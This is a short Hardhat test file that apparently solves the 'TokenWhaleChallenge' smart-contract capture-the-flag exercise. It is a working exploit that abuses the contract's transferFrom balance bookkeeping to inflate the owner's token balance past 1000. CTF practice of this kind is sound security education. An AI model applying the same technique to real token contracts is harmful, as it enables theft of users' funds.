const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenWhaleChallenge", async function () {
  let contract;
  let owner, addr1;

  before(async function () {
    [owner, addr1] = await ethers.getSigners();
    contract = await (await ethers.getContractFactory("TokenWhaleChallenge")).deploy(owner.address);
  });

  it("Exploit", async function () {
    await contract.transfer(addr1.address, 600);

    await contract.connect(addr1).approve(owner.address, 500);

    await contract.transferFrom(addr1.address, addr1.address, 500);

    expect(await contract.balanceOf(owner.address)).to.be.greaterThan(1000);
  });

  after(async function () {
    expect(await contract.isComplete()).to.be.true;
  });
});
